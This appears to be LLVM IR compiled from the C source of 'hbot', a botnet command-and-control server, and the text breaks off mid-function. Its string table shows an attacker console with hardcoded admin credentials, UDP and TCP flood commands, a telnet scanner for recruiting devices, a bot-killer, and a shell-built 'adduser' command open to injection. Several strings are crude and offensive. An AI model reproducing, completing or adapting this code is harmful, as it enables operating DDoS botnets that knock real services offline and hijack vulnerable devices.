; ModuleID = 'host/ir_O3/Hakai.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], [512 x i8], i8 }
%struct.telnetdata_t = type { i32, i32, [20 x i8] }
%struct.name = type { [512 x i8], i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.account = type { [200 x i8], [200 x i8], [200 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"\0D\0A\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"name:\00", align 1
@arra = internal global [40 x %struct.name] zeroinitializer, align 16
@.str.7 = private unnamed_addr constant [9 x i8] c".DSLKFJ\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"LOCKED \00", align 1
@fileFD = internal unnamed_addr global %struct._IO_FILE* null, align 8
@.str.10 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"killed pid\00", align 1
@BOATSRAPED = internal global i32 0, align 4
@.str.12 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.14 = private unnamed_addr constant [6 x i8] c"\22%s\22\0A\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.15 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.17 = private unnamed_addr constant [15 x i8] c"[%d.%d.%d.%d]\0A\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.23 = private unnamed_addr constant [35 x i8] c"%c]0;%d Devices Connected %s  %s%c\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\5C\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"|\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.24 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@.str.25 = private unnamed_addr constant [7 x i8] c"shadoh\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"!HBOT\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.27 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.28 = private unnamed_addr constant [30 x i8] c"\1B[1;31mUsername\1B[1;36m:\1B[37m \00", align 1
@.str.30 = private unnamed_addr constant [15 x i8] c"connection.log\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.32 = private unnamed_addr constant [26 x i8] c"[LOGIN ATTEMPT] USER: %s\0A\00", align 1
@.str.33 = private unnamed_addr constant [30 x i8] c"\1B[1;31mPassword\1B[1;36m:\1B[37m \00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"[FAILED ATTEMPT] USER: %s\0A\00", align 1
@.str.36 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.37 = private unnamed_addr constant [43 x i8] c"\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.29 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.39 = private unnamed_addr constant [6 x i8] c"count\00", align 1
@.str.40 = private unnamed_addr constant [9 x i8] c"botcount\00", align 1
@.str.41 = private unnamed_addr constant [30 x i8] c"\1B[37;1m%s\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [33 x i8] c"\1B[37;1mtotal\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [6 x i8] c"rape?\00", align 1
@.str.44 = private unnamed_addr constant [34 x i8] c"\1B[0mhbot.botkill: \1B[1;31m%d\1B[0m\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.47 = private unnamed_addr constant [28 x i8] c"\1B[0mresolved [%s] to [%s]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.49 = private unnamed_addr constant [37 x i8] c"\1B[0mddoscmds - shows ddos commands\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [36 x i8] c"servercmds - server side commands\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [29 x i8] c"admincmds - admin commands\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"servercmds\00", align 1
@.str.53 = private unnamed_addr constant [29 x i8] c"\1B[0mbots - shows bot count\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [29 x i8] c"exit - disconnect from net\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [28 x i8] c"help - displays help menu\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [10 x i8] c"admincmds\00", align 1
@.str.57 = private unnamed_addr constant [51 x i8] c"\1B[0mbtype - shows architecture of bots connected\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [46 x i8] c"users - displays who's connected to the net\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [66 x i8] c"addusr - add users via server side (IN DEVELOPMENT! VERY BUGGY)\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [32 x i8] c"start - starts telnet scanner\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [39 x i8] c"kickuser - logs user out must be admin\00", align 1
@.str.62 = private unnamed_addr constant [41 x i8] c"You Must Be Admin to Use This Command!\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"ddoscmds\00", align 1
@.str.64 = private unnamed_addr constant [28 x i8] c"\1B[0mUDP ip port time size\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [24 x i8] c"TCP ip port time size\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"\1B[0m\00", align 1
@.str.69 = private unnamed_addr constant [16 x i8] c"Attack Sent! \0D\0A\00", align 1
@.str.70 = private unnamed_addr constant [12 x i8] c"actions.log\00", align 1
@.str.71 = private unnamed_addr constant [31 x i8] c"[hbot] [%s] [Sent an Attack!]\0A\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c". KT\00", align 1
@.str.73 = private unnamed_addr constant [32 x i8] c"[hbot] [%s] [Killed All Pid's]\0A\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"users\00", align 1
@.str.76 = private unnamed_addr constant [39 x i8] c"\1B[31m- \1B[31mOnline Users \1B[31m-\1B[37m\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [37 x i8] c"\1B[37mID(\1B[31m%d\1B[37m) \1B[31m%s\1B[37m\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"kickuser\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"user=\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"USER=\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.82 = private unnamed_addr constant [43 x i8] c"\0A\1B[31mGoodbye, kicked by \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [30 x i8] c"\1B[33mKicked \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"id=\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"ID=\00", align 1
@.str.86 = private unnamed_addr constant [46 x i8] c"\1B[33mKicked user with id of \1B[34m%d\1B[37m...\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [53 x i8] c"You Must Be big daddy shadoh to kick others, queer\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.89 = private unnamed_addr constant [24 x i8] c"echo '\0A%s' >> login.txt\00", align 1
@.str.90 = private unnamed_addr constant [33 x i8] c"[hbot] [%s] [added a user] [%s]\0A\00", align 1
@.str.91 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"chat.log\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.95 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.96 = private unnamed_addr constant [26 x i8] c"[hbot] [Admin Connected] \00", align 1
@.str.97 = private unnamed_addr constant [39 x i8] c"[hbot] [Admin Connected] [%d.%d.%d.%d]\00", align 1
@.str.98 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external local_unnamed_addr global %struct._IO_FILE*, align 8
@.str.99 = private unnamed_addr constant [46 x i8] c"[hbot] Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.101 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.102 = private unnamed_addr constant [11 x i8] c"killer.txt\00", align 1
@kfileFD = internal unnamed_addr global %struct._IO_FILE* null, align 8
@.str.104 = private unnamed_addr constant [33 x i8] c"[hbot] Socket Opened On Port %d\0A\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"hbot\00", align 1
@.str.109 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.110 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1
@str = private unnamed_addr constant [30 x i8] c"[hbot] Lower Threading Count.\00"

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8* nocapture, i32, i32) local_unnamed_addr #0 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #10
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %14, %13
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.0.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.0.lcssa = phi i32 [ 1, %3 ], [ %.0.lcssa.ph, %.critedge.loopexit ]
  ret i32 %.0.lcssa
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #0 {
  %2 = tail call i64 @strlen(i8* %0) #9
  %3 = add i64 %2, 4294967295
  %4 = tail call i16** @__ctype_b_loc() #11
  %5 = load i16*, i16** %4, align 8
  br label %6

; <label>:6:                                      ; preds = %6, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %6 ], [ 0, %1 ]
  %7 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %8 = load i8, i8* %7, align 1
  %9 = sext i8 %8 to i64
  %10 = getelementptr inbounds i16, i16* %5, i64 %9
  %11 = load i16, i16* %10, align 2
  %12 = and i16 %11, 8192
  %13 = icmp eq i16 %12, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %13, label %.preheader, label %6

.preheader:                                       ; preds = %6
  %14 = trunc i64 %3 to i32
  %15 = trunc i64 %indvars.iv29 to i32
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %.critedge.preheader, label %.lr.ph22

.lr.ph22:                                         ; preds = %.preheader
  %sext = shl i64 %3, 32
  %17 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %18 = ashr exact i64 %sext31, 32
  br label %78

.critedge.preheader.loopexit:                     ; preds = %78, %87
  %.0.lcssa.ph = phi i32 [ %86, %78 ], [ %88, %87 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %14, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %19 = icmp sgt i32 %15, %.0.lcssa
  br i1 %19, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %20 = ashr exact i64 %sext32, 32
  %21 = sext i32 %.0.lcssa to i64
  %22 = icmp sgt i64 %21, %20
  %smax = select i1 %22, i64 %21, i64 %20
  %23 = add nsw i64 %smax, 1
  %24 = sub nsw i64 %23, %20
  %min.iters.check = icmp ult i64 %24, 32
  br i1 %min.iters.check, label %.critedge.preheader39, label %min.iters.checked

.critedge.preheader39:                            ; preds = %middle.block, %vector.memcheck, %min.iters.checked, %.critedge.preheader26
  %indvars.iv.ph = phi i64 [ %20, %vector.memcheck ], [ %20, %min.iters.checked ], [ %20, %.critedge.preheader26 ], [ %ind.end, %middle.block ]
  br label %.critedge

min.iters.checked:                                ; preds = %.critedge.preheader26
  %n.vec = and i64 %24, -32
  %cmp.zero = icmp eq i64 %n.vec, 0
  br i1 %cmp.zero, label %.critedge.preheader39, label %vector.memcheck

vector.memcheck:                                  ; preds = %min.iters.checked
  %25 = icmp sgt i64 %21, %20
  %smax34 = select i1 %25, i64 %21, i64 %20
  %26 = add nsw i64 %smax34, 1
  %27 = sub nsw i64 %26, %20
  %scevgep = getelementptr i8, i8* %0, i64 %27
  %scevgep35 = getelementptr i8, i8* %0, i64 %20
  %scevgep36 = getelementptr i8, i8* %0, i64 %26
  %bound0 = icmp ugt i8* %scevgep36, %0
  %bound1 = icmp ult i8* %scevgep35, %scevgep
  %memcheck.conflict = and i1 %bound0, %bound1
  %ind.end = add nsw i64 %20, %n.vec
  br i1 %memcheck.conflict, label %.critedge.preheader39, label %vector.body.preheader

vector.body.preheader:                            ; preds = %vector.memcheck
  %28 = add nsw i64 %n.vec, -32
  %29 = lshr exact i64 %28, 5
  %30 = add nuw nsw i64 %29, 1
  %xtraiter = and i64 %30, 3
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %vector.body.prol.loopexit, label %vector.body.prol.preheader

vector.body.prol.preheader:                       ; preds = %vector.body.preheader
  br label %vector.body.prol

vector.body.prol:                                 ; preds = %vector.body.prol, %vector.body.prol.preheader
  %index.prol = phi i64 [ %index.next.prol, %vector.body.prol ], [ 0, %vector.body.prol.preheader ]
  %prol.iter = phi i64 [ %prol.iter.sub, %vector.body.prol ], [ %xtraiter, %vector.body.prol.preheader ]
  %31 = add i64 %20, %index.prol
  %32 = getelementptr inbounds i8, i8* %0, i64 %31
  %33 = bitcast i8* %32 to <16 x i8>*
  %wide.load.prol = load <16 x i8>, <16 x i8>* %33, align 1, !alias.scope !1
  %34 = getelementptr i8, i8* %32, i64 16
  %35 = bitcast i8* %34 to <16 x i8>*
  %wide.load38.prol = load <16 x i8>, <16 x i8>* %35, align 1, !alias.scope !1
  %36 = getelementptr inbounds i8, i8* %0, i64 %index.prol
  %37 = bitcast i8* %36 to <16 x i8>*
  store <16 x i8> %wide.load.prol, <16 x i8>* %37, align 1, !alias.scope !4, !noalias !1
  %38 = getelementptr i8, i8* %36, i64 16
  %39 = bitcast i8* %38 to <16 x i8>*
  store <16 x i8> %wide.load38.prol, <16 x i8>* %39, align 1, !alias.scope !4, !noalias !1
  %index.next.prol = add i64 %index.prol, 32
  %prol.iter.sub = add i64 %prol.iter, -1
  %prol.iter.cmp = icmp eq i64 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !6

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %40 = icmp ult i64 %28, 96
  br i1 %40, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %41 = add i64 %20, %index
  %42 = getelementptr inbounds i8, i8* %0, i64 %41
  %43 = bitcast i8* %42 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %43, align 1, !alias.scope !1
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %45, align 1, !alias.scope !1
  %46 = getelementptr inbounds i8, i8* %0, i64 %index
  %47 = bitcast i8* %46 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %47, align 1, !alias.scope !4, !noalias !1
  %48 = getelementptr i8, i8* %46, i64 16
  %49 = bitcast i8* %48 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %49, align 1, !alias.scope !4, !noalias !1
  %index.next = add i64 %index, 32
  %50 = add i64 %20, %index.next
  %51 = getelementptr inbounds i8, i8* %0, i64 %50
  %52 = bitcast i8* %51 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %52, align 1, !alias.scope !1
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %54, align 1, !alias.scope !1
  %55 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %56 = bitcast i8* %55 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %56, align 1, !alias.scope !4, !noalias !1
  %57 = getelementptr i8, i8* %55, i64 16
  %58 = bitcast i8* %57 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %58, align 1, !alias.scope !4, !noalias !1
  %index.next.1 = add i64 %index, 64
  %59 = add i64 %20, %index.next.1
  %60 = getelementptr inbounds i8, i8* %0, i64 %59
  %61 = bitcast i8* %60 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %61, align 1, !alias.scope !1
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %63, align 1, !alias.scope !1
  %64 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %65 = bitcast i8* %64 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %65, align 1, !alias.scope !4, !noalias !1
  %66 = getelementptr i8, i8* %64, i64 16
  %67 = bitcast i8* %66 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %67, align 1, !alias.scope !4, !noalias !1
  %index.next.2 = add i64 %index, 96
  %68 = add i64 %20, %index.next.2
  %69 = getelementptr inbounds i8, i8* %0, i64 %68
  %70 = bitcast i8* %69 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %70, align 1, !alias.scope !1
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %72, align 1, !alias.scope !1
  %73 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %74 = bitcast i8* %73 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %74, align 1, !alias.scope !4, !noalias !1
  %75 = getelementptr i8, i8* %73, i64 16
  %76 = bitcast i8* %75 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %76, align 1, !alias.scope !4, !noalias !1
  %index.next.3 = add i64 %index, 128
  %77 = icmp eq i64 %index.next.3, %n.vec
  br i1 %77, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !8

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %24, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

; <label>:78:                                     ; preds = %87, %.lr.ph22
  %indvars.iv27 = phi i64 [ %indvars.iv.next28, %87 ], [ %17, %.lr.ph22 ]
  %.021 = phi i32 [ %88, %87 ], [ %14, %.lr.ph22 ]
  %79 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i64
  %82 = getelementptr inbounds i16, i16* %5, i64 %81
  %83 = load i16, i16* %82, align 2
  %84 = and i16 %83, 8192
  %85 = icmp eq i16 %84, 0
  %86 = trunc i64 %indvars.iv27 to i32
  br i1 %85, label %.critedge.preheader.loopexit, label %87

; <label>:87:                                     ; preds = %78
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %88 = add nsw i32 %.021, -1
  %89 = icmp sgt i64 %indvars.iv27, %18
  br i1 %89, label %78, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %90 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %91 = load i8, i8* %90, align 1
  %92 = sub nsw i64 %indvars.iv, %20
  %93 = getelementptr inbounds i8, i8* %0, i64 %92
  store i8 %91, i8* %93, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %94 = icmp slt i64 %indvars.iv, %21
  br i1 %94, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !11

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %95 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %95, 32
  %96 = ashr exact i64 %sext33, 32
  %97 = getelementptr inbounds i8, i8* %0, i64 %96
  store i8 0, i8* %97, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) local_unnamed_addr #0 {
  %4 = alloca [56 x i8], align 16
  %5 = alloca i64, align 8
  %6 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %7 = icmp eq i32 %6, 0
  %8 = tail call i64 @strlen(i8* %0) #9
  %9 = add i64 %8, 10
  %10 = tail call noalias i8* @malloc(i64 %9) #10
  %11 = tail call i64 @strlen(i8* %0) #9
  %12 = add i64 %11, 10
  tail call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 %12, i32 1, i1 false)
  %13 = tail call i8* @strcpy(i8* %10, i8* %0) #10
  tail call void @trim(i8* %10)
  %14 = call i64 @time(i64* nonnull %5) #10
  %15 = call %struct.tm* @localtime(i64* nonnull %5) #10
  %16 = call i8* @asctime(%struct.tm* %15) #10
  call void @trim(i8* %16)
  %17 = getelementptr inbounds [56 x i8], [56 x i8]* %4, i64 0, i64 0
  %18 = zext i32 %1 to i64
  br i1 %7, label %.split.us.preheader, label %.split.preheader

.split.preheader:                                 ; preds = %3
  br label %.split

.split.us.preheader:                              ; preds = %3
  br label %.split.us

.split.us:                                        ; preds = %.split.us.preheader, %31
  %indvars.iv = phi i64 [ %indvars.iv.next, %31 ], [ 0, %.split.us.preheader ]
  %19 = icmp eq i64 %indvars.iv, %18
  br i1 %19, label %31, label %20

; <label>:20:                                     ; preds = %.split.us
  %21 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 3
  %22 = load i8, i8* %21, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %31, label %24

; <label>:24:                                     ; preds = %20
  %25 = call i64 @strlen(i8* %0) #9
  %26 = trunc i64 %indvars.iv to i32
  %27 = call i64 @send(i32 %26, i8* %0, i64 %25, i32 16384) #10
  %28 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv, i32 2, i64 0
  %29 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0), i8* %28) #10
  %30 = call i64 @send(i32 %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i64 1, i32 16384) #10
  br label %31

; <label>:31:                                     ; preds = %20, %24, %.split.us
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 1000000
  br i1 %exitcond, label %.us-lcssa.us.loopexit, label %.split.us

.split:                                           ; preds = %.split.preheader, %58
  %indvars.iv34 = phi i64 [ %indvars.iv.next35, %58 ], [ 0, %.split.preheader ]
  %32 = icmp eq i64 %indvars.iv34, %18
  br i1 %32, label %58, label %33

; <label>:33:                                     ; preds = %.split
  %34 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv34, i32 3
  %35 = load i8, i8* %34, align 1
  %36 = icmp eq i8 %35, 0
  %37 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv34, i32 1
  %38 = load i32, i32* %37, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %36, label %40, label %.thread

; <label>:40:                                     ; preds = %33
  br i1 %39, label %58, label %.thread.thread

.thread:                                          ; preds = %33
  br i1 %39, label %.thread._crit_edge, label %.thread.thread

.thread._crit_edge:                               ; preds = %.thread
  %.pre37 = trunc i64 %indvars.iv34 to i32
  br label %46

.thread.thread:                                   ; preds = %40, %.thread
  %41 = trunc i64 %indvars.iv34 to i32
  %42 = call i64 @send(i32 %41, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 7, i32 16384) #10
  %43 = call i64 @strlen(i8* %2) #9
  %44 = call i64 @send(i32 %41, i8* %2, i64 %43, i32 16384) #10
  %45 = call i64 @send(i32 %41, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384) #10
  br label %46

; <label>:46:                                     ; preds = %.thread._crit_edge, %.thread.thread
  %.pre-phi38 = phi i32 [ %.pre37, %.thread._crit_edge ], [ %41, %.thread.thread ]
  %47 = call i64 @strlen(i8* %0) #9
